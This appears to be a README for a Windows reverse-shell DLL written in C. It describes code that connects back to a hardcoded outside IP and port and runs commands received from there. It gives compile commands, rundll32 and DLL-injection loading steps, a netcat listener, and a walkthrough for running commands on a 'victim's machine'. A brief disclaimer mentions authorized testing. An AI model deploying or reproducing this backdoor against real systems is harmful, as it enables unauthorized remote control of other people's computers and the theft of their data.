# Introduction to ReverseShell DLL

This is a C source code that creates a Reverse Shell in the form of a Dynamic Link Library (DLL) on Windows, utilizing Winsock to establish a reverse connection to a remote server. This DLL can be used to execute remote commands via a TCP connection.

## Main Features
- **Establishes a reverse connection** (Reverse Shell) to a specified IP address and port.
- **Receives commands** from the remote server and executes them on the victim's machine.
- **Sends the command execution results** back to the server.

## Code Structure
- **ReverseShell**: The main function that handles the reverse connection and command processing.
- **DllMain**: The DLL entry point, automatically calls the `ReverseShell` function when the DLL is loaded into a process.

## Connection Details
- **Server IP**: `3.7.100.109` (can be modified in the source code).
- **Port**: `57588` (can be modified in the source code).

---

# How to Compile and Use

## Requirements
- A **C compiler** that supports Windows, such as **Microsoft Visual Studio**.
- The **Winsock library** (`ws2_32.lib`) for network functions.

## Compilation Instructions

### 1. **Prepare the Source Code**:
   - Copy the provided code into a `.c` file (e.g., `reverseshell.c`).

### 2. **Compile the Code into a DLL**:
   - Open a **Developer Command Prompt** for Visual Studio.
   - Navigate to the directory where the `reverseshell.c` file is saved.
   - Run the following command to compile the source code:
     ```bash
     cl /LD reverseshell.c /link ws2_32.lib
     ```
     This command will compile the code into a DLL named `reverseshell.dll`.

### 3. **Verification**:
   - Ensure that the `.dll` file is successfully created in the current directory.
   - You should see the file `reverseshell.dll` after the compilation completes.

## How to Use the DLL

### 1. **Load the DLL into a Process**:
   - To execute the DLL, use a tool like **`rundll32.exe`**:
     ```bash
     rundll32.exe reverseshell.dll,ReverseShell
     ```
   - Alternatively, inject the DLL into another process using **DLL Injection techniques**, such as **`CreateRemoteThread`** and **`LoadLibrary`**.

### 2. **Set Up a Listening Server**:
   - On the attacker's server (with IP `3.7.100.109`), use a tool like **`netcat`** to listen on port `57588`:
     ```bash
     nc -lvp 57588
     ```
   - This will allow the server to accept the incoming reverse connection from the victim machine.

### 3. **Execute Commands**:
   - After successfully loading the DLL on the victim machine, it will connect back to the server.
   - From the server terminal, you can send system commands (e.g., `dir`, `whoami`) and receive their output.
     Example:
     ```bash
     dir
     whoami
     ```
   - The results will be sent back and displayed on the server's terminal.

---

# Notes
- **Customization**: You can modify the IP address and port by changing the `domain` and `port` variables in the source code before compiling.
- **Security Considerations**: This code is intended for **security testing** purposes only. Always use it in controlled environments, and ensure that you have explicit permission before testing on any network or system.
- **Legal and Ethical Use**: Ensure compliance with local laws, regulations, and ethical guidelines when using this code.
- **Limitations**: The code is a basic implementation and does not include detailed error handling. If the server fails to respond or if there is network instability, the connection may be interrupted or closed.

---

# Practical Example

### Step 1: Compile the DLL
- First, compile the `reverseshell.c` file into a DLL using:
  ```bash
  cl /LD reverseshell.c /link ws2_32.lib
  ```
### Step 2: Set Up the Server to Listen for Incoming Connections
- On your attacker machine, start a listener using netcat:
```
nc -lvp 57588
```
### Step 3: Load the DLL on the Victim’s Machine
- Load the reverseshell.dll into the victim's machine process using rundll32.exe:
```
rundll32.exe reverseshell.dll,ReverseShell
```
### Step 4: Send a Command from the Server
- Once the victim's machine connects back to your server, you can send commands from your netcat listener, such as:
```
dir
```

  
